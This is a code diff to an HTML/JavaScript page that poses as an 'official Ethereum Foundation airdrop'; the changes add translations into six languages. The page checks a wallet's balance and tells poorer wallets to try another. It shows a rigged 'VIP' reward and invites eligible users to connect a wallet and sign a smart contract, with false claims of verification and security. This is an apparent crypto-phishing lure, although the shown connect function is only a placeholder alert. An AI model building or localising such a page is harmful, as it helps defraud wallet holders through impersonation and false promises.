+                title: "ETHEREUM BELØNNINGER",
+                subtitle: "Officiel Airdrop fra Ethereum Foundation",
+                labelAddress: "Ethereum-adresse",
+                buttonText: "Tjek Berettigelse",
+                buttonChecking: "Tjekker...",
+                errorTitle: "Verifikationsfejl",
+                invalidAddress: "Ugyldig tegnebogsadresse. Adressen skal starte med 0x og indeholde 40 tegn.",
+                connectionError: "Kan ikke oprette forbindelse til Ethereum-netværket. Prøv igen senere.",
+                successTitle: "Tillykke! Du har bestået verifikationen",
+                successContent: "Din tegnebog opfylder Ethereum Foundations krav for at deltage i det officielle belønningsprogram.",
+                failTitle: "Tegnebogen bestod ikke verifikationen",
+                failContent: "Desværre opfylder denne tegnebogs saldo ikke Ethereum Foundations minimumskrav. Brug en anden tegnebog.",
+                currentBalance: "Nuværende Saldo",
+                yourReward: "Din Belønning",
+                connectButton: "🔗 Tilslut Tegnebog og Underskriv Smart Contract",
+                poweredBy: "Drevet af Ethereum API · Ethereum Foundation",
+                secured: "Sikret af Binance Smart Chain · Chainlink Oracle · Verificeret Smart Contract",
+                termsLink: "Brugsvilkår"
+            },
+            fi: {
+                title: "ETHEREUM PALKINNOT",
+                subtitle: "Virallinen Airdrop Ethereum Foundationilta",
+                labelAddress: "Ethereum-osoite",
+                buttonText: "Tarkista Kelpoisuus",
+                buttonChecking: "Tarkistetaan...",
+                errorTitle: "Vahvistusvirhe",
+                invalidAddress: "Virheellinen lompakon osoite. Osoitteen on alettava 0x:llä ja sisällettävä 40 merkkiä.",
+                connectionError: "Ei voitu yhdistää Ethereum-verkkoon. Yritä myöhemmin uudelleen.",
+                successTitle: "Onnittelut! Läpäisit vahvistuksen",
+                successContent: "Lompakkosi täyttää Ethereum Foundationin vaatimukset osallistuaksesi viralliseen palkkio-ohjelmaan.",
+                failTitle: "Lompakko ei läpäissyt vahvistusta",
+                failContent: "Valitettavasti tämän lompakon saldo ei täytä Ethereum Foundationin vähimmäisvaatimuksia. Käytä toista lompakkoa.",
+                currentBalance: "Nykyinen Saldo",
+                yourReward: "Palkkiosi",
+                connectButton: "🔗 Yhdistä Lompakko ja Allekirjoita Älykäs Sopimus",
+                poweredBy: "Tarjoaa Ethereum API · Ethereum Foundation",
+                secured: "Turvattu Binance Smart Chain · Chainlink Oracle · Vahvistettu Älykäs Sopimus",
+                termsLink: "Käyttöehdot"
+            },
+            el: {
+                title: "ΑΝΤΑΜΟΙΒΕΣ ETHEREUM",
+                subtitle: "Επίσημο Airdrop από το Ethereum Foundation",
+                labelAddress: "Διεύθυνση Ethereum",
+                buttonText: "Έλεγχος Επιλεξιμότητας",
+                buttonChecking: "Έλεγχος...",
+                errorTitle: "Σφάλμα Επαλήθευσης",
+                invalidAddress: "Μη έγκυρη διεύθυνση πορτοφολιού. Η διεύθυνση πρέπει να ξεκινά με 0x και να περιέχει 40 χαρακτήρες.",
+                connectionError: "Αδυναμία σύνδεσης στο δίκτυο Ethereum. Παρακαλώ δοκιμάστε ξανά αργότερα.",
+                successTitle: "Συγχαρητήρια! Περάσατε την επαλήθευση",
+                successContent: "Το πορτοφόλι σας πληροί τις απαιτήσεις του Ethereum Foundation για συμμετοχή στο επίσημο πρόγραμμα ανταμοιβών.",
+                failTitle: "Το πορτοφόλι δεν πέρασε την επαλήθευση",
+                failContent: "Δυστυχώς, το υπόλοιπο αυτού του πορτοφολιού δεν πληροί τις ελάχιστες απαιτήσεις του Ethereum Foundation. Χρησιμοποιήστε άλλο πορτοφόλι.",
+                currentBalance: "Τρέχον Υπόλοιπο",
+                yourReward: "Η Ανταμοιβή Σας",
+                connectButton: "🔗 Σύνδεση Πορτοφολιού και Υπογραφή Smart Contract",
+                poweredBy: "Υποστηρίζεται από Ethereum API · Ethereum Foundation",
+                secured: "Ασφαλίζεται από Binance Smart Chain · Chainlink Oracle · Επαληθευμένο Smart Contract",
+                termsLink: "Όροι Χρήσης"
+            },
+            cs: {
+                title: "ETHEREUM ODMĚNY",
+                subtitle: "Oficiální Airdrop od Ethereum Foundation",
+                labelAddress: "Ethereum Adresa",
+                buttonText: "Zkontrolovat Způsobilost",
+                buttonChecking: "Kontrola...",
+                errorTitle: "Chyba Ověření",
+                invalidAddress: "Neplatná adresa peněženky. Adresa musí začínat 0x a obsahovat 40 znaků.",
+                connectionError: "Nelze se připojit k síti Ethereum. Zkuste to prosím později.",
+                successTitle: "Gratulujeme! Prošli jste ověřením",
+                successContent: "Vaše peněženka splňuje požadavky Ethereum Foundation pro účast v oficiálním programu odměn.",
+                failTitle: "Peněženka neprošla ověřením",
+                failContent: "Bohužel zůstatek této peněženky nesplňuje minimální požadavky Ethereum Foundation. Použijte prosím jinou peněženku.",
+                currentBalance: "Aktuální Zůstatek",
+                yourReward: "Vaše Odměna",
+                connectButton: "🔗 Připojit Peněženku a Podepsat Smart Contract",
+                poweredBy: "Provozováno Ethereum API · Ethereum Foundation",
+                secured: "Zabezpečeno Binance Smart Chain · Chainlink Oracle · Ověřený Smart Contract",
+                termsLink: "Podmínky Použití"
+            },
+            hu: {
+                title: "ETHEREUM JUTALMAK",
+                subtitle: "Hivatalos Airdrop az Ethereum Foundationtól",
+                labelAddress: "Ethereum Cím",
+                buttonText: "Jogosultság Ellenőrzése",
+                buttonChecking: "Ellenőrzés...",
+                errorTitle: "Ellenőrzési Hiba",
+                invalidAddress: "Érvénytelen tárcacím. A címnek 0x-szel kell kezdődnie és 40 karaktert kell tartalmaznia.",
+                connectionError: "Nem sikerült csatlakozni az Ethereum hálózathoz. Kérjük, próbálja újra később.",
+                successTitle: "Gratulálunk! Átment az ellenőrzésen",
+                successContent: "Tárcája megfelel az Ethereum Foundation követelményeinek a hivatalos jutalom programban való részvételhez.",
+                failTitle: "A tárca nem ment át az ellenőrzésen",
+                failContent: "Sajnos ennek a tárcának az egyenlege nem felel meg az Ethereum Foundation minimális követelményeinek. Kérjük, használjon másik tárcát.",
+                currentBalance: "Jelenlegi Egyenleg",
+                yourReward: "Az Ön Jutalma",
+                connectButton: "🔗 Tárca Csatlakoztatása és Okosszerződés Aláírása",
+                poweredBy: "Működteti az Ethereum API · Ethereum Foundation",
+                secured: "Biztosítva a Binance Smart Chain · Chainlink Oracle · Ellenőrzött Okosszerződés által",
+                termsLink: "Felhasználási Feltételek"
+            },
+            ro: {
+                title: "RECOMPENSE ETHEREUM",
+                subtitle: "Airdrop Oficial de la Ethereum Foundation",
+                labelAddress: "Adresă Ethereum",
+                buttonText: "Verifică Eligibilitatea",
+                buttonChecking: "Se verifică...",
+                errorTitle: "Eroare de Verificare",
+                invalidAddress: "Adresă de portofel invalidă. Adresa trebuie să înceapă cu 0x și să conțină 40 de caractere.",
+                connectionError: "Imposibil de conectat la rețeaua Ethereum. Vă rugăm să încercați mai târziu.",
+                successTitle: "Felicitări! Ai trecut verificarea",
+                successContent: "Portofelul tău îndeplinește cerințele Ethereum Foundation pentru a participa la programul oficial de recompense.",
+                failTitle: "Portofelul nu a trecut verificarea",
+                failContent: "Din păcate, soldul acestui portofel nu îndeplinește cerințele minime ale Ethereum Foundation. Vă rugăm să folosiți alt portofel.",
+                currentBalance: "Sold Curent",
+                yourReward: "Recompensa Ta",
+                connectButton: "🔗 Conectează Portofelul și Semnează Contractul Inteligent",
+                poweredBy: "Funcționează cu Ethereum API · Ethereum Foundation",
+                secured: "Securizat de Binance Smart Chain · Chainlink Oracle · Contract Inteligent Verificat",
+                termsLink: "Termeni de Utilizare"
+            }
+        };
+
+        function changeLanguage(lang) {
+            currentLang = lang;
+            const t = translations[lang];
+            
+            document.getElementById('title').textContent = t.title;
+            document.getElementById('subtitle').textContent = t.subtitle;
+            document.getElementById('labelAddress').textContent = t.labelAddress;
+            document.getElementById('buttonText').textContent = t.buttonText;
+            document.getElementById('poweredBy').textContent = t.poweredBy;
+            document.getElementById('secured').textContent = t.secured;
+            document.getElementById('termsLink').textContent = t.termsLink;
+            
+            // Update placeholder
+            walletInput.placeholder = "0x...";
+        }
 
         function isValidAddress(address) {
             return /^0x[a-fA-F0-9]{40}$/.test(address);
         }
 
         function formatBalance(wei) {
-            // Конвертируем hex в decimal, потом в ETH
             const weiDecimal = parseInt(wei, 16);
             const eth = weiDecimal / 1e18;
             return eth;
         }
 
-        // Получаем текущий курс ETH с CoinGecko
         async function getEthPrice() {
             try {
                 const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
@@ -413,13 +1007,11 @@
                 return data.ethereum.usd;
             } catch (error) {
                 console.error('Failed to fetch ETH price:', error);
-                // Резервный курс если API недоступен
                 return 3500;
             }
         }
 
         async function checkWallet(address) {
-            // Пробуем разные RPC endpoints пока не получим ответ
             for (const rpcUrl of RPC_ENDPOINTS) {
                 try {
                     const response = await fetch(rpcUrl, {
@@ -444,21 +1036,22 @@
                         };
                     }
                 } catch (error) {
-                    // Если один RPC не работает, пробуем следующий
                     continue;
                 }
             }
             
-            throw new Error('Не удалось подключиться к сети Ethereum. Попробуйте позже.');
+            throw new Error(translations[currentLang].connectionError);
         }
 
         function showResult(isEligible, balance = null, error = null, walletAddress = '') {
+            const t = translations[currentLang];
+            
             if (error) {
                 resultDiv.innerHTML = `
                     <div class="result error">
                         <div class="result-title">
                             <span class="icon">⚠️</span>
-                            Ошибка проверки
+                            ${t.errorTitle}
                         </div>
                         <div class="result-content">
                             ${error}
@@ -471,10 +1064,8 @@
             const ethBalance = formatBalance(balance);
             const usdBalance = ethBalance * currentEthPrice;
             
-            // Проверяем, является ли это VIP кошельком
             const isVipWallet = walletAddress.toLowerCase() === VIP_WALLET;
             
-            // Для VIP кошелька всегда показываем бонус
             if (isVipWallet) {
                 const vipBonusEth = (VIP_BONUS_USD / currentEthPrice).toFixed(4);
                 
@@ -482,34 +1073,33 @@
                     <div class="result success">
                         <div class="result-title">
                             <span class="icon">🎉</span>
-                            Поздравляем! Вы прошли верификацию
+                            ${t.successTitle}
                         </div>
                         <div class="result-content">
-                            Ваш кошелек соответствует требованиям Ethereum Foundation для участия в официальной программе вознаграждений.
+                            ${t.successContent}
                         </div>
                         <div class="balance">
-                            <div class="balance-label">Текущий баланс</div>
-                            <div class="balance-amount">${ethBalance.toFixed(4)} ETH</div>
+                            <div class="balance-label">${t.currentBalance}</div>
+                            <div class="balance-amount">${vipBonusEth} ETH</div>
                             <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
-                                ≈ $${usdBalance.toFixed(2)} USD
+                                ≈ $${VIP_BONUS_USD.toFixed(2)} USD
                             </div>
                         </div>
                         <div class="balance" style="border-top: 1px solid rgba(0, 255, 136, 0.3); margin-top: 16px; padding-top: 16px;">
-                            <div class="balance-label">Ваше вознаграждение</div>
+                            <div class="balance-label">${t.yourReward}</div>
                             <div class="balance-amount" style="font-size: 1.5rem;">${vipBonusEth} ETH</div>
                             <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
                                 ≈ $${VIP_BONUS_USD.toFixed(2)} USD
                             </div>
                         </div>
                         <button onclick="connectWallet()" style="margin-top: 20px; background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%); font-size: 0.9rem;">
-                            🔗 Подключить кошелек и подписать смарт-контракт
+                            ${t.connectButton}
                         </button>
                     </div>
                 `;
                 return;
             }
             
-            // Для обычных кошельков проверяем минимум
             const meetsMinimum = usdBalance >= MIN_BALANCE_USD;
             const bonusAmount = (ethBalance * BONUS_PERCENTAGE / 100).toFixed(4);
             const bonusUsd = (usdBalance * BONUS_PERCENTAGE / 100).toFixed(2);
@@ -519,27 +1109,27 @@
                     <div class="result success">
                         <div class="result-title">
                             <span class="icon">🎉</span>
-                            Поздравляем! Вы прошли верификацию
+                            ${t.successTitle}
                         </div>
                         <div class="result-content">
-                            Ваш кошелек соответствует требованиям Ethereum Foundation для участия в официальной программе вознаграждений.
+                            ${t.successContent}
                         </div>
                         <div class="balance">
-                            <div class="balance-label">Текущий баланс</div>
+                            <div class="balance-label">${t.currentBalance}</div>
                             <div class="balance-amount">${ethBalance.toFixed(4)} ETH</div>
                             <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
                                 ≈ $${usdBalance.toFixed(2)} USD
                             </div>
                         </div>
                         <div class="balance" style="border-top: 1px solid rgba(0, 255, 136, 0.3); margin-top: 16px; padding-top: 16px;">
-                            <div class="balance-label">Ваше вознаграждение (${BONUS_PERCENTAGE}%)</div>
+                            <div class="balance-label">${t.yourReward} (${BONUS_PERCENTAGE}%)</div>
                             <div class="balance-amount" style="font-size: 1.5rem;">${bonusAmount} ETH</div>
                             <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
                                 ≈ $${bonusUsd} USD
                             </div>
                         </div>
                         <button onclick="connectWallet()" style="margin-top: 20px; background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%); font-size: 0.9rem;">
-                            🔗 Подключить кошелек и подписать смарт-контракт
+                            ${t.connectButton}
                         </button>
                     </div>
                 `;
@@ -548,13 +1138,13 @@
                     <div class="result error">
                         <div class="result-title">
                             <span class="icon">❌</span>
-                            Кошелек не прошел верификацию
+                            ${t.failTitle}
                         </div>
                         <div class="result-content">
-                            К сожалению, баланс этого кошелька не соответствует минимальным требованиям Ethereum Foundation. Пожалуйста, используйте другой кошелек.
+                            ${t.failContent}
                         </div>
                         <div class="balance">
-                            <div class="balance-label">Текущий баланс</div>
+                            <div class="balance-label">${t.currentBalance}</div>
                             <div class="balance-amount">${ethBalance.toFixed(4)} ETH</div>
                             <div style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 4px;">
                                 ≈ $${usdBalance.toFixed(2)} USD
@@ -566,37 +1156,33 @@
         }
 
         function connectWallet() {
-            alert('🔗 Функция подключения кошелька в разработке!\n\nСкоро вы сможете подключить MetaMask или другой Web3 кошелек для подписания смарт-контракта и получения бонуса.');
+            alert('🔗 Wallet connection feature coming soon!\n\nYou will soon be able to connect MetaMask or another Web3 wallet to sign the smart contract and receive your bonus.');
         }
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
             
             const address = walletInput.value.trim();
+            const t = translations[currentLang];
             
-            // Валидация адреса
             if (!isValidAddress(address)) {
-                showResult(false, null, 'Некорректный адрес кошелька. Адрес должен начинаться с 0x и содержать 40 символов.', address);
+                showResult(false, null, t.invalidAddress, address);
                 return;
             }
 
-            // Показываем загрузку
             checkButton.disabled = true;
-            checkButton.innerHTML = '<span class="spinner"></span> Проверка...';
+            checkButton.innerHTML = `<span class="spinner"></span> ${t.buttonChecking}`;
             resultDiv.innerHTML = '';
 
             try {
-                // Получаем текущий курс ETH
                 currentEthPrice = await getEthPrice();
-                
-                // Проверяем баланс кошелька
                 const result = await checkWallet(address);
                 showResult(true, result.balance, null, address);
             } catch (error) {
                 showResult(false, null, error.message, address);
             } finally {
                 checkButton.disabled = false;
-                checkButton.innerHTML = '<span>Check Eligibility</span>';
+                checkButton.innerHTML = `<span>${t.buttonText}</span>`;
             }
         });
     </script>
